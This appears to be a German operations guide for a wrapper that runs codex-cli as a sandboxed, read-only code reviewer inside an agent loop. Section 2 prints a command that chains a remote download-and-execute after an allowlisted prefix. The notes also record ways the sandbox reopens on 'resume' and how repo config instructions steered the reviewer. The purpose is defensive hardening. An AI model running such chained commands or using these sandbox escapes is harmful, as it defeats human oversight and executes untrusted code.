# claudex-loop — verifizierte Betriebsnotizen

Gilt für alle Projekte, die den claudex-loop nutzen, **Windows wie macOS**. Was hier
steht, ist gegen `codex-cli 0.149.1` **gemessen**, nicht vermutet; wo etwas nur plausibel
ist, steht es dabei.

Diese Datei hieß bis zum 28.08.2026 `betrieb-windows.md` und war als Sammlung von
„Abweichungen vom Original-Skill unter Windows" gebaut. Das trägt nicht mehr: der Wrapper
ist plattformneutral und hat die meisten dieser Abweichungen geschluckt. Geblieben ist die
eigentlich wertvolle Hälfte — **was gemessen wurde**. Sie steht jetzt dort, wo sie
hingehört: als Begründung hinter dem, was der Wrapper tut.

> **Namen seit 27.08.2026:** `codex-review` → **`plan-review`** (prüft den Plan, vor dem
> Code), `codex-verify` → **`code-review`** (prüft den fertigen Diff gegen den Plan). Die
> alten Namen waren gegenüber dem Sprachgebrauch vertauscht; ältere Protokolle führen sie
> noch.

---

## 1. Was der Wrapper garantiert — und warum

Kanonisch ist `scripts/codex_ro.py` in diesem Repo. Der `setup`-Skill kopiert ihn je Repo
nach `tools/codex_ro.py`; `scripts/wrapper_drift.py` meldet zurückliegende Kopien und hebt
sie mit `--update` an. **Nicht abschreiben, nicht neu bauen** — am 28.08.2026 existierten
sieben Kopien in drei Ständen, die beiden CRITICAL-Fixes jenes Tages in genau einer davon.

Jede Zeile der folgenden Tabelle war einmal eine verlorene Stunde:

| Der Wrapper erledigt | Warum es sonst weh tut |
| --- | --- |
| Pfade nach Plattform normalisieren | `codex.exe` ist ein Windows-Binary und versteht Git-Bash-Pfade wie `/tmp/x` nicht — es schreibt ins Leere, ohne zu klagen. |
| Prompt über **stdin** | Argumente werden nicht gequotet; ein mehrwortiger Prompt zerfällt in Einzelargumente. Zugleich liest `codex exec` stdin **zusätzlich** zum Prompt-Argument: ohne EOF hängt es unter einem nicht-interaktiven Treiber ewig bei ~0 % CPU. Der stdin-Weg löst beides mit einer Entscheidung. |
| stderr in eine **Datei** | Ein abgelaufener Token liefert Exit 0, eine gültige `thread_id` und eine **leere** Verdict-Datei. Der 401 steht ausschließlich in stderr. `2>/dev/null` verschluckt genau diesen Fall. |
| Timeout (Vorgabe 600 s) | Ein Stall soll laut scheitern statt stumm zu hängen. Über das Bash-Tool zusätzlich `timeout: 600000` setzen — der 2-Minuten-Default killt echte Reviews mittendrin. |
| MCP-Server je Aufruf abschalten | Sie bringen für einen Review nichts und kosten Startzeit. ⛔ `-c mcp_servers="{}"` wirkt **nicht** (getestet, die Server starten trotzdem) — nur der dotted-path-Weg `-c mcp_servers.<name>.enabled=false` je Server greift. |
| read-only hart setzen | `-s read-only` bei `exec`; beim `resume` gibt es **kein** `-s`, dort geht es nur über `-c sandbox_mode=read-only`. Jedes weitere `-c sandbox_mode` / `approval_policy` / `sandbox_permissions` wird mit Exit 2 abgewiesen. |
| Pfadargumente einsperren | Der Wrapper löscht seine Ausgabedatei vor jedem Lauf. Ein unbegrenztes Pfadargument wäre damit ein Schreib-Primitiv auf die ganze Platte. Erlaubt sind Repo und Temp-Verzeichnis, mehr nur per `--allow-path` / `CLAUDEX_ALLOWED_PATHS`. |

Jeder Aufruf braucht seit 2.5.0 zusätzlich `--expect-workdir "$TARGET"` — die
Zusicherung, dass die Sitzung im erwarteten Verzeichnis gestartet wurde (Details
und die verbindliche Stanza im folgenden Abschnitt, wörtlich gleich in allen
aufrufenden Skills):

<!-- claudex-target:begin -->
### Review target (`target=`)

The skill argument `target=<absolute path>` (same `key=value` grammar as
`scope=` / `SPEC_FILE=`) names the directory under review. If it is missing,
ASK the human for it. ⛔ Never derive it from `$PWD`, `$(pwd)`, `.`, the
harness's working directory, or the output of any command — a value the
session derives from itself confirms itself, which is the incident this
exists for.

Precondition: the session must have been STARTED in exactly this directory.
A `cd` does not persist between tool calls, and a `cd … &&` in front of the
wrapper call is denied by the guard — reviewing some other repo from here is
not supported; start a session there instead.

Show the value to the human BEFORE the first wrapper call:

```bash
# TARGET is the literal value of the skill argument target= -- substituted by whoever
# runs this block. Copied unchanged it fails closed: the wrapper refuses a non-absolute value.
TARGET='<target= argument>'
echo "Review scope: $TARGET"
```

The wrapper refuses with exit 2 when `$TARGET` is not the working directory —
that is a STOP: tell the human, do not retry with a different value. A
different exit 2, `unrecognized arguments: --expect-workdir`, is not a scope
mismatch — this repo's `tools/codex_ro.py` predates 2.5.0 and does not know
the flag yet. Update it from the plugin
(`python <plugin>/scripts/wrapper_drift.py --repo . --update --private-root <your projects folder>`, see `setup`)
and rerun. ⛔ Never drop the flag to make the error go away.
<!-- claudex-target:end -->

**Aufruf:**

```bash
python tools/codex_ro.py --expect-workdir "$TARGET" --prompt-file p.txt \
                         --out-file "$SCRATCH_DIR/verdict-r1.txt"
python tools/codex_ro.py --expect-workdir "$TARGET" --resume <thread-id> --prompt-file p2.txt \
                         --out-file "$SCRATCH_DIR/verdict-r2.txt"
```

Auf macOS heißt der Interpreter in der Regel `python3`. Exit-Codes: `0` Antwort da,
`1` leere Antwort bei Exit 0 (der Auth-Fall), `2` abgewiesen (auch: eine Ausgabe, die ein
anderer Lauf gesperrt hält; eine `.codex/config.toml` im Arbeitsverzeichnis oder darüber; ein
Modell, das die installierte CLI nicht kann), **`3` blind** — nachweisbar kein Befehl
ausgeführt und eine Sandbox-Ablehnung oder ein unbrauchbarer Beleg: das Review **nicht**
protokollieren —, `124` Timeout, `127` kein codex gefunden, sonst codex' eigener Code.

⛔ **Auch Ping und Resume laufen über den Wrapper.** Ein direkter `codex exec` umgeht
Sandbox-Pin, Pfadgrenzen, stderr-Datei, Timeout und MCP-Abschaltung auf einmal — und
genau dann, wenn man es eilig hat.

⚠️ **Korrektur (Sec. 1b in `main()`, gemessen).** Hier stand bis zum 18.09.2026, der
Wrapper brauche ein Git-Verzeichnis, sonst verweigere Codex mit „Not inside a trusted
directory", und die Flagge aus der Fehlermeldung (`--skip-git-repo-check`) werde „nie"
gesetzt, weil sie „Codex' Schreibwurzel auf das Repo" begrenze. Beides war falsch.
`build_argv()` setzt die Flagge seit dem 09.09.2026 **unbedingt** — bei jedem Aufruf,
git-Repo oder nicht. Ein cwd außerhalb eines Git-Repos ist seither kein Abbruch mehr,
nur eine Warnung (`main()`, „1b. Outside a git repo"). Die „Schreibwurzel"-Begründung
war aus upstream Issue #10 übernommen und hier nie nachgemessen worden; @mraol08831 hat
sie auf upstream PR #15 gemessen und widerlegt: `workspace-write` meldet seine Wurzeln
als `[cwd, /tmp, $TMPDIR]` — das **Arbeitsverzeichnis**, nicht der Repo-Root, mit und
ohne Flagge gleich. Hier auf codex-cli 0.149.1 nachgestellt. Die Flagge schaltet nur eine
Start-**Trust**-Prüfung ab, nichts an der Sandbox. Praktisch bleibt trotzdem wichtig,
wo man startet: die Pfadeinsperrung des Wrappers (read/write roots) hängt am
**Arbeitsverzeichnis**, nicht am Repo-Root — und seit Wrapper 2.5.0 nennt die Kopfzeile
dieses cwd immer:

```
# codex read-only | exec (new) | gpt-6-sol/medium | timeout 600s | wrapper 2.6.0
#   cwd: D:\…\wegwerf-repo   (git repo)          <- oder "(kein git repo)"
#   codex-cli 0.156.0                             <- mit "(measured against …)" bei Abweichung
```

Greenfield (noch kein Repo): einfach loslegen, der Wrapper warnt nur; `git init` ist
nicht mehr Voraussetzung, nur weiterhin sinnvoll für `build`, das mit vollen
Schreibrechten läuft und dort von einer Rückrollbarkeit profitiert.

### Der Scope kommt vom Sitzungsstart, nicht von einem `cd` (docs/audit/2026-09-11-scope.md §3)

Nur eine Sitzung, die im Zielverzeichnis **gestartet** wurde, ist unterstützt — ein
Verzeichniswechsel mitten in der Sitzung erreicht den Wrapper-Aufruf nicht. Gemessen:

| Werkzeug | Befund |
| --- | --- |
| Bash-Tool, alleinstehendes `cd C:\…\Temp` | Harness antwortet: *"Shell cwd was reset to d:\…\uj-claudex-loop"* — der Wechsel hält nicht über den Aufruf hinaus |
| PowerShell-Tool, `Set-Location` + `Get-Location` | zeigt den neuen Pfad **nur innerhalb** desselben Aufrufs, danach dieselbe Rücksetzung |
| `cd X && python tools/codex_ro.py …` in einem Aufruf | vom `wrapper_guard.py`-Hook verweigert (Exit 2) |

Der eine Aufruf, der beides täte — wechseln und den Wrapper im selben Kommando starten
— ist damit gesperrt, und ein alleinstehender Wechsel hält nicht über den nächsten
Werkzeugaufruf hinaus. **Es gibt genau einen unterstützten Weg:** eine Sitzung, die im
Zielverzeichnis beginnt. ⛔ Ein Verzeichniswechsel lässt sich **nicht** über zwei
getrennte Werkzeugaufrufe „mitnehmen" — genau das zeigt die Messung oben, der zweite
Aufruf läuft wieder im ursprünglichen Verzeichnis. Zwei getrennte Aufrufe sind der
Ausweg nur für einen **zweiten Befehl**, der sonst an den Wrapper-Aufruf angekettet
würde (`… && …`), nie für das cwd.

⚠️ **G-1, am Rande:** Text, der den Wrapper-Pfad nur **zitiert** — etwa in einem Heredoc
mit typografischen Anführungszeichen — kann vom Guard mit „unbalanced quotes" abgewiesen
werden, obwohl nichts ausgeführt wird. Solchen Text über eine Datei schreiben, nicht per
Heredoc.

### Wohin die Dateien gehen

`SCRATCH_DIR` ist **keine konfigurierte Größe**, sondern wird zur Laufzeit aufgelöst: das
Scratchpad des Harness, wenn es eines stellt, sonst `<repo>/.claudex-tmp/`, im selben
Schritt angelegt und gitignoriert. Es gehört deshalb **nicht** in die `.env` — die hält
Reviewer-Zugänge, und zwei Quellen für dieselbe Sache driften.

⛔ **Nie `/tmp`.** Weltlesbar, also liegen Plan-Kritiken dort für jeden anderen Nutzer der
Maschine offen; unter macOS zusätzlich ein Symlink auf `/private/tmp`, was den Abgleich
gegen `git rev-parse --show-toplevel` bricht (das löst Symlinks auf, Transkript-Pfade
nicht). Dateinamen **je Runde** — ein fester Name, jede Runde überschrieben, vernichtet
bei einem fehlgeschlagenen Schreibvorgang still die Kritik der Vorrunde, und eine
verlorene Kritik sieht aus wie eine Runde ohne Funde.

Dauerhaft ins Repo gehören Plan und Review-Log; alles andere ist Zwischenablage. **Eine
Runde ist erst fertig, wenn ihre Ausgabe im Log steht.**

---

## 2. Was der Wrapper *nicht* kann: Sandbox und Freigaben

Gemessen mit `codex-cli 0.149.1`, jeweils Schreibversuch in ein leeres Git-Verzeichnis,
**mit Positivkontrolle** — ohne die wäre ein „schreibt nicht" wertlos, weil es auch heißen
könnte, dass die Probe nie schreibt:

| Aufruf | schreibt? | heißt |
|---|---|---|
| `exec -s read-only` | nein | Basislinie |
| `exec -s read-only -c sandbox_mode="danger-full-access"` | **nein** | **`-s` gewinnt gegen nachgestelltes `-c`** |
| `exec -s danger-full-access` | ja | Positivkontrolle — die Probe erkennt eine offene Sandbox |
| `resume -c sandbox_mode="read-only" -c sandbox_mode="danger-full-access"` | **ja** | **späteres `-c` gewinnt** |

Daraus folgt: bei `codex exec` mit explizitem `-s read-only` ist der **Sandbox-Modus**
nicht mehr aufreißbar; bei `codex exec resume` schon, weil es dort kein `-s` gibt und das
letzte `-c` gewinnt.

⛔ **Hier stand bis zum 28.08.2026 der Satz „eine Präfix-Regel wäre für `exec` technisch
dicht". Er war in seinem eigenen Rahmen wahr und trotzdem gefährlich** — und er ist die
Ursache eines CRITICAL-Befunds. Er denkt nur über das Sandbox-Flag nach. Eine
Allowlist-Regel deckt aber den **Anfang des Kommandos**, nicht das Kommando: was hinter
dem erlaubten Präfix steht, läuft auf derselben Freigabe mit.

```
python tools/codex_ro.py --out-file v.txt && curl http://example.com/x.sh | sh
```

Der Wrapper nagelt Codex' Sandbox fest. Er hat nichts darüber zu sagen, was hinter seinem
Aufruf im selben Kommando steht. **Der Wrapper allein macht eine Freigabe nicht sicher.**

Die zweite Hälfte ist ein **PreToolUse-Hook** des Plugins (`hooks/wrapper_guard.py`). Er
weist jeden Wrapper-Aufruf ab, der Verkettung, Pipe, Umleitung, Kommandosubstitution oder
unbalancierte Anführungszeichen mitführt — und unterscheidet dabei *Aufruf* von *Erwähnung*:
ein `grep` nach dem Dateinamen ist keine Ausführung.

**Solange der Hook nicht im laufenden Betrieb nachweislich abgelehnt hat, gehört keine
Wrapper-Zeile in die Allowlist.** Freigegeben ist dann nur `Bash(codex --version)`; Preis
sind rund sechs Rückfragen über fünf Runden — genau an dieser Stelle soll ein Mensch sehen,
in welcher Sandbox Codex startet. Ist der Hook geprüft, darf zurück:

```json
"Bash(python tools/codex_ro.py*)",
"Bash(python3 tools/codex_ro.py*)"
```

⚠️ **Eine breite Interpreter-Freigabe hebelt das alles aus.** `Bash(*)`, `Bash(powershell:*)`,
`Bash(python tools/*)`, `Bash(sed *)`, `Bash(awk *)`, `Bash(find *)` — jede davon führt
beliebigen Code aus, und die sorgfältig verengte codex-Zeile daneben ist Dekoration. Vor
dem Berufen auf die Regel die eigene `settings.local.json` prüfen; der `setup`-Skill bringt
dafür einen Detektor mit (Schritt 0).

---

## 3. Modell, Abschottung und MCP

**Modell: `gpt-6-sol`/`medium` für jede Codex-Rolle** (seit 30.09.2026; `gpt-5.6-terra` wurde
am 22.09.2026 durch `gpt-6-sol` abgelöst). Gemessen auf codex-cli 0.156.0: eine echte
Plan-Review-Runde ≈ **4:48 min** mit 48 Befehlen — innerhalb des 600-s-Timeouts. Modell und
Effort kommen aus `claudex_roles.py --spec <rolle>`, nie aus dem Skill. ⛔ codex-cli 0.149.1
beantwortet `gpt-6-sol` bei jedem Aufruf mit HTTP 400; der Wrapper weist das vorab mit Exit 2
ab (`MODEL_MIN_CLI`).

Historie, damit sie nicht wieder gelernt werden muss: am 30.08.2026 lief `gpt-5.6-sol`/high
an einem 120-Zeilen-Plan in den 10-Minuten-Timeout (Exit 143), `gpt-5.6-terra`/high brauchte
1–2 Minuten je Runde; die frühere `sol`-Empfehlung stammte aus einem 8-Sekunden-Smoketest.
Deshalb gilt: Modellwahl nach einer **echten** Runde, nie nach einem Ping.

**Der Exposure-Pass** (`exposure-review`, aus `code-review` und `audit`) läuft seither auf
demselben Modell. Sein eigener Eintrag in der Rollen-Config bleibt, damit er sich wieder
trennen lässt; die zweite Meinung kommt heute aus einer frischen Sitzung mit engerer Eingabe,
nicht aus einem anderen Modell.

**Abschottung (Wrapper 2.6.0).** Read-only legt nur die **Shell** fest. Alles andere, was
Codex laden kann, läuft daneben: MCP-Server aus der Nutzer-Config oder aus der
`.codex/config.toml` eines vertrauenswürdigen Projekts, und auf 0.156.0 eine Reihe
standardmäßig eingeschalteter Features. Jeder Wrapper-Aufruf (`exec` **und** `resume`) läuft
deshalb mit `--ignore-user-config`, `--ignore-rules`, `-c web_search="disabled"` und
`--disable <feature>` für jede Zeile der ersten Tabelle. Gemessen am 30.09.2026: `web__run`,
`image_gen`, `request_plugin_install`, die MCP-Werkzeuge und `goals` verschwinden; der
Lesebefehl läuft, und die festgelegten `-c`-Schlüssel (`sandbox_mode`, `windows.sandbox`,
Modell, Effort) gelten weiter. Upstream: chaseai-yt/claudex-loop#28 und #18.

| Feature | im Wrapper |
|---|---|
| `apps` | abgeschaltet |
| `plugins` | abgeschaltet |
| `remote_plugin` | abgeschaltet |
| `browser_use` | abgeschaltet |
| `browser_use_external` | abgeschaltet |
| `browser_use_full_cdp_access` | abgeschaltet |
| `computer_use` | abgeschaltet |
| `in_app_browser` | abgeschaltet |
| `multi_agent` | abgeschaltet |
| `goals` | abgeschaltet |
| `image_generation` | abgeschaltet |
| `skill_mcp_dependency_install` | abgeschaltet |
| `hooks` | abgeschaltet |
| `workspace_dependencies` | abgeschaltet |
| `plugin_sharing` | abgeschaltet |
| `tool_suggest` | abgeschaltet |
| `skill_search` | abgeschaltet |
| `auth_elicitation` | abgeschaltet |
| `tool_call_mcp_elicitation` | abgeschaltet |
| `realtime_conversation` | abgeschaltet |
| `in_app_local_automation` | abgeschaltet |
| `worktrees` | abgeschaltet |

| Feature | im Wrapper |
|---|---|
| `shell_tool` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `unified_exec` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `unified_exec_tty` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `shell_snapshot` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `view_image` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `sleep_tool` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `content_item_kinds` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `compaction_image_budget` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `enable_request_compression` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `fast_mode` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `guardian_approval` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `guardian_reuse_parent_compaction` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `mentions_v2` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `secret_auth_storage` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `system_proxy_fallback` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `unbounded_connection_retries` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `code_mode_host` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `in_app_chat` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `in_app_dictation` | bleibt an (Shell, Ausgabe, App-Oberfläche) |
| `in_app_updates` | bleibt an (Shell, Ausgabe, App-Oberfläche) |

Beim **Heben der CLI** (§8) wird `codex features list` gegen beide Tabellen gelegt: ein
Feature, das stable und `true` ist und in keiner steht, blockiert das Anheben der Messversion,
bis es eingeordnet ist.

⛔ **Nicht abschaltbar: `collaboration.*`** (Sub-Agenten starten). Kein Feature-Schalter
entfernt die Werkzeuge (`multi_agent` und `collaboration_modes` versucht). Gemessen erbt ein
gestarteter Sub-Agent read-only (Schreibversuch abgewiesen, Datei fehlt) **und** die
Abschottung (dieselben fünf Werkzeuge wie der Haupt-Lauf, kein Web/App/Plugin/MCP). Seine
Befehle stehen nicht im Strom des Haupt-Laufs — daraus folgt ein bekannter Fehlalarm in die
sichere Richtung: haben nur Sub-Agenten Befehle ausgeführt **und** steht eine Ablehnung in
stderr, endet der Lauf mit Exit 3.

⛔ **Projekt-Config des geprüften Repos.** Gemessen am 30.09.2026: in einem in der Nutzer-Config
als vertrauenswürdig eingetragenen Repo lud Codex dessen `.codex/config.toml`, und eine
`developer_instructions`-Zeile darin bestimmte die Antwort. Unter `--ignore-user-config` gibt es
keine Vertrauenseinträge, die Datei wurde nicht geladen. Zweite Linie: liegt eine
`.codex/config.toml` im Arbeitsverzeichnis oder in **irgendeinem** Verzeichnis darüber (bis zur
Laufwerkswurzel), bricht der Wrapper mit Exit 2 ab. Ausgenommen sind nur die Nutzer-Configs
selbst (`$CODEX_HOME/config.toml` und `~/.codex/config.toml`). Der `.codex/`-Kontextordner, den
`setup` anlegt (`README.md`, `knowledge.md`), ist davon nicht betroffen.

**MCP** wird seit 2.6.0 nicht mehr Server für Server abgeschaltet: die Nutzer-Config, die die
Server definiert, wird gar nicht geladen. `--disable-mcp` und `CLAUDEX_DISABLE_MCP` werden
angenommen und als ignoriert gemeldet. (Ein Override für einen *nicht definierten* Server
würde Codex die ganze Config ablehnen lassen — der Grund, warum die alte Logik nur installierte
Server benannte; unter `--ignore-user-config` ist jeder undefiniert.) Ein kaputter MCP-Eintrag in
`~/.codex/config.toml` betrifft damit nur noch die eigene, nicht-Wrapper-Arbeit; wenn dort ein
Klartext-Token steht, gehört es trotzdem in den Vault (`codex mcp add --bearer-token-env-var`).

---

## 4. Zwei Lehren aus dem ersten echten Lauf (26.08.2026)

**1. Plantext inline in den Prompt — die Begründung dafür war allerdings falsch.** Im
ersten Lauf wurden *alle* Shell-Aufrufe von Codex mit `rejected: blocked by policy`
abgewiesen. Hier stand daraufhin, die frisch angelegte, noch untrackte `PLAN.md` sei der
Grund, und der Nachsatz „Repo-Dateien liest Codex weiterhin selbst" war schlicht nicht
wahr.

⛔ **Korrektur 16.09.2026, gemessen.** Der Grund war ein anderer und viel größerer: unter
Windows wählt `codex exec` ohne `[windows] sandbox` in der Config **gar kein**
Sandbox-Backend aus und weist damit **jeden** Shell-Aufruf ab — Lesen eingeschlossen, in
`read-only` wie in `workspace-write` gleichermaßen (nachgemessen auf codex-cli 0.149.1;
upstream `openai/codex#42172`, `#44839`, `#43633`). Mit `git` hatte das nie etwas zu tun.

Die Empfehlung bleibt trotzdem richtig, nur aus anderem Grund: Inlining bindet das Review
an einen Hash und macht es unabhängig davon, ob die Plandatei überhaupt gespeichert ist.
Der Schaden lag anderswo — das Inlining ließ das Plan-Review funktionieren und **verdeckte
damit, dass Codex drei Wochen lang keine einzige Repo-Datei lesen konnte**. Genau so trat
es am 16.09.2026 in `s100-scripte` wieder auf: Funde erst ab Runde 2, sichtbar nur dort,
wo Quelltext von Hand in den Prompt kopiert worden war.

Der Wrapper setzt das Backend seit **2.4.0** selbst (`windows.sandbox="unelevated"`) und
bricht mit Exit 3 ab, wenn ein Lauf keinen einzigen Befehl ausführen konnte — ein
Reviewer, der nichts lesen konnte, liefert sonst ein zuversichtliches Urteil über nichts.

**2. `MAX_ROUNDS` zu erreichen ist kein Misserfolg.** Der erste Lauf endete formal ohne
`APPROVED`, war aber konvergiert: 11 → 9 → 5 → 5 → 1 Funde, ab Runde 2 kein einziger
begründet abgelehnt. Aussagekräftiger als das Verdikt ist die **Fundkurve** plus die
Frage, wie viele Funde man begründet zurückweisen konnte.

---

## 5. Voraussetzungen

| | |
|---|---|
| `codex --version` | muss eine Version **ausgeben**; gefordert ≥ 0.156.0 (für `gpt-6-sol`), gemessen mit 0.156.0 — die Wrapper-Kopfzeile zeigt die gefundene |
| `codex login status` | `Logged in using ChatGPT` (Abo, **kein** API-Key) |
| Python | 3.10+ für Wrapper, Drift-Prüfung und Hook |
| Plugin | `claudex-loop@claudex-loop`, enabled |

⛔ **Leere Ausgabe plus Exit ≠ 0 ist weder ein Hänger noch ein Auth-Problem**, sondern ein
totes Binary — nicht wiederholen. Exit 137 (SIGKILL) unter macOS heißt: eine alte
npm-globale Installation überschattet das aktuelle CLI, das inzwischen **in der
ChatGPT-App** liegt (`/Applications/ChatGPT.app/Contents/Resources/codex`). Abhilfe: dieses
Binary in ein PATH-Verzeichnis vor der alten Installation verlinken, dann lässt der
*Nutzer* `sudo npm uninstall -g @openai/codex` laufen (braucht sein Passwort).
⛔ `~/.codex/` **nicht** löschen — `config.toml`, `auth.json` und die Sessions liegen dort
und werden vom gebündelten Binary weiter genutzt. Der Wrapper erkennt und benennt diesen
Fall. `CLAUDEX_CODEX_BIN` gibt es seit 2.3.0 nicht mehr (Audit 2026-09-02, CRITICAL: eine
per Umgebung gesetzte Variable durfte auf einem unbeaufsichtigten, allowlisteten Aufruf
nicht mehr bestimmen dürfen, welches Programm als „Codex" läuft) — den Symlink-Fix oben
anwenden, dann findet die PATH-Suche das Bundle selbst.
(Upstream [issue #10](https://github.com/chaseai-yt/claudex-loop/issues/10))

**Immer aus dem Repo-Root starten.** Codex lädt von dort automatisch die `AGENTS.md` — der
Prüfkatalog steht darin. Der Eintrag `trust_level = "trusted"` in `~/.codex/config.toml`
gilt seit Wrapper 2.6.0 nur noch für die eigene Arbeit außerhalb des Wrappers: der Wrapper
lädt die Nutzer-Config nicht (`--ignore-user-config`) und übergibt `--skip-git-repo-check`.

---

## 6. Kontingent-Ausfall: Fallback oder Überspringen statt Dead-End

Upstream-Problem ([claudex-loop#7](https://github.com/chaseai-yt/claudex-loop/issues/7)):
läuft das Codex-Kontingent (5-h- oder Wochenfenster des ChatGPT-Abos) mitten im Loop aus,
endet der Skill im Nichts. **Regel: erkennen, Restkontingent und Reset-Zeit nennen, dann
entscheidet der NUTZER** — warten, Fallback-Reviewer, oder die Review-Phase geloggt
überspringen. Nie still, nie automatisch. Ein Same-Model-Review durch Claude selbst ist
KEIN Ersatz für den Cross-Model-Check und wird nicht als solcher verkauft.

### Restkontingent abfragen — lokal, ohne API-Call

Codex schreibt nach jedem Turn einen `rate_limits`-Snapshot in die Session-Rollouts
(`~/.codex/sessions/YYYY/MM/DD/rollout-*.jsonl`): `primary` = 5-h-Fenster, `secondary` =
Wochenfenster, je `used_percent` + `resets_at`, dazu `credits.balance`. Verifiziert
27.08.2026 gegen codex-cli 0.149.1.

```bash
python scripts/codex_usage.py            # menschenlesbar, Exit 1 ab 95 % Verbrauch
python scripts/codex_usage.py --json     # Roh-Snapshot
```

Der Snapshot ist so alt wie der letzte Lauf. Nach längerer Pause frischt ihn ein Ping über
den Wrapper auf (~20k Input-Tokens, im Fenster ein Rundungsfehler).

### Protokoll im Loop

1. **Vor Runde 1:** `codex_usage.py`. Exit 1 → gar nicht erst starten, Verbrauch und
   Reset-Zeit nennen, entscheiden lassen.
2. **Erkennung im Lauf** (stderr-Datei lesen — deshalb nie `/dev/null`): 429 / „usage
   limit" / „quota" in stderr, `rate_limit_reached_type` ≠ null im Rollout, oder das
   bekannte Muster *Exit 0 + gültige thread_id + leere Verdict-Datei* (auch ein 401 sieht
   so aus).
3. **Kein blinder Retry.** Loop anhalten, Ursache und Reset-Zeit nennen, Nutzer wählt:
   **warten** (danach `--resume $THREAD_ID`, der Session-Kontext bleibt; ist der Thread
   weg, frische Session mit dem bisherigen Log inline), **Fallback-Reviewer** (unten),
   **überspringen** mit explizitem Log-Eintrag — der Plan gilt dann als *nicht
   cross-reviewed* — oder **abbrechen**.
4. Die Fundkurve-Regel gilt sinngemäß: ein nach N Runden abgebrochener Lauf mit
   dokumentierten Runden ist mehr wert als ein erzwungenes „APPROVED" von einem
   Ersatz-Reviewer, der nur abnickt.

### Fallback-Reviewer über `.env`-Profile

`scripts/fallback_review.py` spricht jeden OpenAI-kompatiblen Endpoint — LM Studio, Ollama,
OpenRouter, OpenAI, Gemini (`…/v1beta/openai`), Anthropic (`api.anthropic.com/v1`). Profile
in die **gitignorierte** `.env`, Schlüssel nach Vault-Regel nie inline:

```text
CLAUDEX_REVIEWERS=lmstudio,openrouter
CLAUDEX_REVIEWER_LMSTUDIO_BASE_URL=http://127.0.0.1:1234/v1
CLAUDEX_REVIEWER_LMSTUDIO_MODEL=qwen/qwen3.8-27b
CLAUDEX_REVIEWER_OPENROUTER_BASE_URL=https://openrouter.ai/api/v1
CLAUDEX_REVIEWER_OPENROUTER_MODEL=deepseek/deepseek-r1
CLAUDEX_REVIEWER_OPENROUTER_API_KEY_ENV=OPENROUTER_API_KEY
```

`--list` zeigt das Konfigurierte, `--reviewer <name>` wählt, **`--check` prefligtet alle
Provider** (lokal nur Erreichbarkeit; OpenRouter echtes Restguthaben via `/credits`;
OpenAI/Gemini/Anthropic haben keine Guthaben-API — Erschöpfung zeigt sich erst als 402/429
bei Nutzung), **`--chain` arbeitet die `CLAUDEX_REVIEWERS`-Reihenfolge als Kette ab**,
erster verfügbarer Provider gewinnt, jeder Skip wird mit Grund ausgewiesen.

Eigenschaften, bewusst anders als der Codex-Pfad:

- **Read-only per Konstruktion** — das Modell bekommt keinerlei Datei- oder Tool-Zugriff;
  Plan und bisheriger Log gehen inline. Kein „hoffentlich hält sich die CLI daran".
- **Kein Session-Gedächtnis** — die API ist stateless; Folgerunden bekommen den bisherigen
  Log per `--log` inline (Ersatz für `resume`).
- **Anti-Rubber-Stamping** — eine `VERDICT:`-Zeile ist Pflicht; ein APPROVED in Runde 1 mit
  < 3 nummerierten Befunden gilt als **ungültiges Review** (Exit 3), nicht als Freigabe.
- **Plan-Hash-Bindung** — SHA256 des Plans steht im Verdict-Header; ein Verdict gilt nur
  für exakt diesen Planstand.
- **Datenschutz umgekehrt** — bei einem lokalen Provider verlässt nichts die Maschine; der
  Codex-Tabu-Scope (Begründung: Upload zu OpenAI) greift dort nicht. Für
  kundendatenlastige Pläne ist der lokale Reviewer der *bessere* Kanal.
- **Log-Kennzeichnung Pflicht** — `## Round <n> — <Modell> (via <reviewer>, fallback)`.
  Ein APPROVED von dort wiegt weniger als eines von Codex/terra; bei hochriskanten Plänen
  nach dem Reset eine Codex-Bestätigungsrunde nachziehen.

⛔ **Findings-Ledger-Regel (alle Skills, alle Reviewer, alle Phasen):** jede
Reviewer-Ausgabe — Codex-Runde, Fallback-Runde (auch ein ungültiger Versuch, so
gekennzeichnet), Cold-Read, Post-Build-Inspection, Recheck, code-review-Pass — wird
**sofort wörtlich** in den Review-Log geschrieben, gefolgt von der Disposition je Befund
(akzeptiert → was geändert / abgelehnt → warum). Nichts lebt nur im Chat; was nicht im Log
steht, ist nicht passiert. Für Fallback-Runden macht das `--append-log <LOG_FILE>`
mechanisch.

---

## 7. Die Skills dieses Forks

Alles **Plugin-Skills** dieses Repos, nicht user-scope installiert:

| Skill | Wofür |
|---|---|
| `claudex-loop` | die vier Phasen: Recon, Interrogate, Review, Build |
| `plan-review` | Plan-Gate — Codex greift den Plan an, bevor Code existiert |
| `build` | Codex baut den eingefrorenen Plan, Claude liest den Diff |
| `code-review` | Abnahme-Gate nach dem Build, `scope=dod,quality,security,docs,tests` |
| `docs-backfill` | stehende Dokumentationsschuld an Code-Einheiten (keine Prosa) |
| `audit` | erster Durchgang über Code, den nie jemand geprüft hat; erzeugt eine Baseline |
| `setup` | richtet ein Repo ein: Wrapper, Reviewer-Rolle, Prüfkatalog, Tabu-Scope, Trust |

```
/claudex-loop:code-review scope=dod,security \
    SPEC_FILE=<plan-ordner>/PLAN.md LOG_FILE=<plan-ordner>/PLAN-REVIEW-LOG.md
```

Für alle gelten dieselben Ausfall-Szenarien wie in §6: Preflight, bei Ausfall warten /
Fallback / geloggt überspringen. Der Adapter kann die Gate-Grammatik fahren:
`--require-verdicts "DOD:COMPLETE|INCOMPLETE,QUALITY:ACCEPTABLE|REVISE,SECURITY:PASS|FAIL"`
